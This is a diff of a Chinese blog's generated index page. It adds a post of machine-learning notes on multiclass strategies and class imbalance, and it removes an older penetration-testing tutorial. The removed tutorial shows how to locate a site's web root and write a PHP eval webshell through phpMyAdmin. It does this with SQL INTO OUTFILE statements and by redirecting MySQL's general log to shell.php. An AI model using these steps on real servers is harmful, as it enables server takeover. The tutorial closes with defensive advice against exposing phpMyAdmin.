@@ -258,6 +258,205 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/26/机器学习-7-——多分类学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="麻薯">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Leticia's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/07/26/机器学习-7-——多分类学习/" itemprop="url">
+                  机器学习(7)——多分类学习
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-07-26T14:59:28+08:00">
+                2018-07-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/机器学习/" itemprop="url" rel="index">
+                    <span itemprop="name">机器学习</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2018/07/26/机器学习-7-——多分类学习/" class="leancloud_visitors" data-flag-title="机器学习(7)——多分类学习">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长</span>
+                
+                <span title="阅读时长">
+                  
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>之前在逻辑回归中也提到了多分类问题，但是仅仅介绍了其中一种情况。多分类还存在一些其他的方式与问题，在这里总结一遍，用作笔记。</p>
+<p>除过那些直接可以由二分类算法推广到多分类的情况，我们就是基于一些策略利用二分类学习器来解决多分类问题。</p>
+<h2 id="0x01-一对一-One-vs-One"><a href="#0x01-一对一-One-vs-One" class="headerlink" title="0x01 一对一(One vs. One)"></a>0x01 一对一(One vs. One)</h2><p>OvO策略是将N个类别，两两配对分类，一共就产生了N(N-1)/2个二分类任务。在测试阶段，我们将新样本提交给所有的分类器，一共得到N(N-1)/2个分类结果，而最终这个新样本属于哪一类，可以通过投票产生，即这N(N-1)/2个分类结果中，预测得到最多得那个分类作为最终分类结果。</p>
+<h2 id="0x02-一对其余-One-vs-Rest"><a href="#0x02-一对其余-One-vs-Rest" class="headerlink" title="0x02 一对其余(One vs. Rest)"></a>0x02 一对其余(One vs. Rest)</h2><p>OvR策略是将N个类别，每次分别取一类作一次正例，其余类都作为反例，一共训练N个分类器。在测试阶段，我们将新样本提交给所有分类器，一共产生N个分类结果，这N个结果中置信度最高的一个就是最终结果。</p>
+<h2 id="0x03-多对多-Many-vs-Many"><a href="#0x03-多对多-Many-vs-Many" class="headerlink" title="0x03 多对多(Many vs. Many)"></a>0x03 多对多(Many vs. Many)</h2><p>MvM策略是每次将一部分类作为正类，一部分其他类作为反类。MvM的正反类构造不能随意选取，必须有特殊的设计。</p>
+<p>最常用的MvM技术是“纠错输出码”(Error Correcting Output Codes)</p>
+<p>纠错输出码是将编码的思想引入类别拆分，并尽可能在解码的过程中具有容错性。纠错输出码的工作过程：</p>
+<ul>
+<li>（1）编码：对N个类别做M次划分，每次划分将一部分类别划为正类，一部分划为反类，从而形成一个二分类训练集。这样一共产生M个训练集，可以训练出M个分类器。</li>
+<li>（2）解码：M个分类器分别对测试样本进行预测，这些预测标记组成一个编码，将这个预测编码与每个类别各自的编码进行比较，返回其中距离最小的类别作为最终预测结果。</li>
+</ul>
+<p>类别划分时使用编码矩阵表示，目前主要的编码矩阵是二元码和三元码：</p>
+<ul>
+<li>二元码： 每个类别有正类、反类两种情况。</li>
+<li>三元码： 每个类别有正类、反类、停用类三种情况。</li>
+</ul>
+<p>如图所示：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml7_01.png?raw=true" alt=""></p>
+<p>以二元码为例，图中使用五个分类器进行MvM分类，然后根据对不同类别的正反分类构成了黑白相间的编码矩阵。</p>
+<p>在解码时，我们将样例输入到五个分类器中，得到一个长度为5的测试样例，然后跟矩阵中c1、c2、c3、c4四个类别的编码方式比较，计算其欧氏距离，距离最小的类别c3就是最终预测结果，也就是说此样例被分类到c3。</p>
+<p>如果MvM用到的分类器越多，横轴也会越长，编码长度也就越长，这样即使有个别分类器预测错误，也不会影响最终结果。也就是说，分类器越多纠错能力越强。不过分类器越多，我们需要训练的次数也就越多，计算量就会增大，所以应当根据实际情况选择合适的分类器数量。</p>
+<h2 id="0x04-类别不平衡问题"><a href="#0x04-类别不平衡问题" class="headerlink" title="0x04 类别不平衡问题"></a>0x04 类别不平衡问题</h2><p>在通常的分类任务中，我们默认几类几类情况的发生几率差距不是特别大，但是如果某一类情况发生几率十分大，比如99.9%，另一类发生几率特别小，比如0.1%。</p>
+<p>这种情况下，我们的样本正例太多，反例太少，学习器往往会出现一些误差。</p>
+<p>此时我们需要用m+表示正例数目，m-表示反例数目，观测几率就是m+/m-，这个时候我们只需要分类器预测几率高于观测几率就应判定为正例，即</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml7_02.png?raw=true" alt=""></p>
+<p>但是我们的分类器是根据y/(1-y)进行决策的，为了适应它，我们只需要“再缩放”一下：</p>
+<p><img src="https://github.com/echohun/blog_image/blob/master/machine_learning/ml7_03.png?raw=true" alt=""></p>
+<h2 id="0x05-参考文档"><a href="#0x05-参考文档" class="headerlink" title="0x05 参考文档"></a>0x05 参考文档</h2><p>《机器学习》——周志华</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/07/25/机器学习-6-——性能度量/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2415,246 +2614,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/22/phpmyadmin注入webshell总结/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="麻薯">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Leticia's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2018/06/22/phpmyadmin注入webshell总结/" itemprop="url">
-                  phpmyadmin注入webshell总结
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-22T13:36:33+08:00">
-                2018-06-22
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-             <span id="/2018/06/22/phpmyadmin注入webshell总结/" class="leancloud_visitors" data-flag-title="phpmyadmin注入webshell总结">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长</span>
-                
-                <span title="阅读时长">
-                  
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>有时候，我们扫到了暴露在公网的phpmyadmin页面，并且能爆破出密码时，我们就可以对目标数据库做一些操作了，这个时候我们想进一步拿到webshell，就有很多种办法可以尝试。</p>
-<p>以下技巧不仅仅能在已经进入phpmyadmin的情况下使用，其他的管理系统或者只要是拥有一定权限的mysql执行环境都可以使用。</p>
-<h2 id="0x01-寻找物理路径"><a href="#0x01-寻找物理路径" class="headerlink" title="0x01 寻找物理路径"></a>0x01 寻找物理路径</h2><p>我们进入phpmyadmin之后想要写webshell，得先知道网站物理路径，才能通过其他办法将构造好的一句话木马写入。所以第一步就是寻找物理路径。</p>
-<h3 id="phpinfo泄露"><a href="#phpinfo泄露" class="headerlink" title="phpinfo泄露"></a>phpinfo泄露</h3><p>物理路径大多是一些页面未作限制导致敏感信息泄露的，所以我们首先从敏感信息泄露入手，方法一般为扫网站目录，如果能得到phpinfo等敏感文件，就很容易得到物理路径。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin01.png?raw=true" alt=""></p>
-<h3 id="错误页面泄露"><a href="#错误页面泄露" class="headerlink" title="错误页面泄露"></a>错误页面泄露</h3><p>有的网站，访问错误页面会提示网站路径，也可以在这方面入手。</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin02.png?raw=true" alt=""></p>
-<p>想要找到网站错误页面，可以尝试：</p>
-<ul>
-<li>单引号爆路径： 在页面后门加单引号，如果网站没有过滤单引号且产生错误，一般会返回错误页面可以读取到物理路径。</li>
-<li>错误参数值爆路径： 在可以post参数的位置，提交错误参数使网站出错，有时会得到物理路径。</li>
-<li>Google爆路径： 通过google语法搜索对应网站包含warning、fatal error的页面，如Site:xxx.com warning和Site:xxx.com.cn “fatal error”，很容易找到错误路径。</li>
-<li>错误解析爆路径： 很多服务器，如果访问一个不存在的php页面等因为不存在而无法解析的页面，会返回解析错误页面，会得到物理路径。</li>
-</ul>
-<h3 id="phpmyadmin爆路径"><a href="#phpmyadmin爆路径" class="headerlink" title="phpmyadmin爆路径"></a>phpmyadmin爆路径</h3><p>找到phpmyadmin的管理页面，再访问该目录下的某些特定文件，就很有可能爆出物理路径。</p>
-<p>如：</p>
-<ul>
-<li>1./phpmyadmin/libraries/lect_lang.lib.php</li>
-<li>2./phpMyAdmin/index.php?lang[]=1</li>
-<li>3./phpMyAdmin/phpinfo.php</li>
-<li>4.load_file()</li>
-<li>5./phpmyadmin/themes/darkblue_orange/layout.inc.php</li>
-<li>6./phpmyadmin/libraries/select_lang.lib.php</li>
-<li>7./phpmyadmin/libraries/lect_lang.lib.php</li>
-<li>8./phpmyadmin/libraries/mcrypt.lib.php</li>
-</ul>
-<h3 id="猜路径"><a href="#猜路径" class="headerlink" title="猜路径"></a>猜路径</h3><p>如果上述方法都没有找到物理路径，我们就得开始猜路径了。</p>
-<p>可以通过常用的网站套件默认路径来猜，如：</p>
-<ul>
-<li>lamp套件： /var/www/html/index.php</li>
-<li>lnmp套件： /home/wwwroot/default</li>
-<li>wamp套件： C:/wamp/www或者D:/wamp/www</li>
-<li>iis服务器： D:/vhost/wwwroot/www</li>
-<li>phpstudy套件： D:/phpstudy/www</li>
-</ul>
-<p>还有非常多，可以自己根据实际情况去搜索。</p>
-<h2 id="0x02-直接写出文件"><a href="#0x02-直接写出文件" class="headerlink" title="0x02 直接写出文件"></a>0x02 直接写出文件</h2><p>物理路径知道了，这个时候我们该在可以访问的物理路径上写webshell了。</p>
-<p>首先我们要确认mysql是否有写文件的权限，可以通过访问secure-file-priv来查看是否有写文件的权限：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%secure%&apos;</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin03.png?raw=true" alt=""></p>
-<p>可以看到我本机的情况是只能在F:/wamp/tmp文件夹下进行写文件，这里secure-file-priv有三种情况：</p>
-<ul>
-<li>NULL： 没有任何路径的写权限。</li>
-<li>‘’： 拥有任何路径的写权限。</li>
-<li>F:/wamp/tmp一类的文件路径： 仅在规定路径下有写权限。</li>
-</ul>
-<p>我们这里如果想直接写文件，需要在www目录下有写权限，为了查看效果，我们先将secure-file-priv改成’’来尝试一下直接写文件。</p>
-<p>要注意，在root账户下的mysql中，也是无法直接对secure-file-priv进行更改的，要更改secure-file-priv，需要打开my.ini文件，将secure_file_priv的值更改，我们在这里将原本的secure-file-priv注释掉，然后写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">secure_file_priv=&quot;&quot;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin04.png?raw=true" alt=""></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin05.png?raw=true" alt=""></p>
-<p>然后我们在phpmyadmin的mysql控制台输入：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Create TABLE shell (webshell text NOT NULL);</span><br><span class="line">Insert INTO shell (webshell) VALUES(&apos;&lt;?php @eval($_POST[123456]);?&gt;&apos;);</span><br><span class="line">select webshell from shell into outfile &apos;F:/wamp/www/eval.php&apos;;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin06.png?raw=true" alt=""></p>
-<p>然后通过菜刀访问：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin07.png?raw=true" alt=""></p>
-<h2 id="0x03-使用log文件"><a href="#0x03-使用log文件" class="headerlink" title="0x03 使用log文件"></a>0x03 使用log文件</h2><p>那么如果是一般的情况，我们只有其他路径权限或者完全没有写权限的时候该怎么做呢？此时有个奇淫技巧，就是使用log文件来写一句话木马。</p>
-<p>phpmyadmin有一个负责mysql日志的文件，通常是关闭的，因为如果一直打开，这个文件随着mysql的查询会变的非常非常的巨大，只有调试时才会有管理员打开。</p>
-<p>不过不同于上面的secure-file-priv无法通过mysql的root账户更改，这个功能是可以直接在mysql的root账户更改的。</p>
-<p>首先我们查看一下这个功能相关的变量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like &apos;%general_log%&apos;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin08.png?raw=true" alt=""></p>
-<p>可以看到两个变量，其中general_log代表日志功能的开关，general_log_file代表日志功能存储的位置，这都是我们可控的变量，现在我们就要把general_log_file改到可以访问的网站目录中的文件，并且把日志功能开启。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set global general_log_file=&quot;F:/wamp/www/shell.php&quot;</span><br><span class="line">set global general_log=&quot;ON&quot;</span><br></pre></td></tr></table></figure>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin09.png?raw=true" alt=""></p>
-<p>此时我们就打开了日志功能并且将日志保存路径切换到网站根目录下的shell.php</p>
-<p>然后我们只需要查询一个一句话木马（注意这里用双引号单引号混用的方法构造select，否则写在日志文件中php会解析错误）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT &apos;&lt;?php @eval($_POST[&quot;123456&quot;]);?&gt;&apos;;</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin10.png?raw=true" alt=""></p>
-<p>就可以通过菜刀连接木马：</p>
-<p><img src="https://github.com/echohun/blog_image/blob/master/phpmyadmin/phpmyadmin11.png?raw=true" alt=""></p>
-<h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>从这次的思路看，如果我们拿到phpmyadmin或者其他的数据库管理工具，甚至直接拿到mysql控制台权限，都可以尝试进一步拿到webshell，而且很可能权限还非常高，可以进一步控制整个服务器。所以将phpmyadmin等页面暴露在公网是十分危险的。</p>
-<p>而且一直以来有很多网站管理员觉得服务器报错之后暴露些物理路径之类的东西无伤大雅，就不写专用的404页面，但是这次的思路也证明了，你的任何一个小失误，都有可能成为黑客入侵的助力，在敏感信息泄露和未授权访问等问题上一定要谨慎。</p>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -2704,7 +2663,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">94</span>
+                <span class="site-state-item-count">95</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -2715,7 +2674,7 @@
             
             <div class="site-state-item site-state-categories">
               <a href="/categories/index.html">
-                <span class="site-state-item-count">23</span>
+                <span class="site-state-item-count">24</span>
                 <span class="site-state-item-name">分类</span>
               </a>
             </div>
@@ -2726,7 +2685,7 @@
             
             <div class="site-state-item site-state-tags">
               <a href="/tags/index.html">
-                <span class="site-state-item-count">60</span>
+                <span class="site-state-item-count">61</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
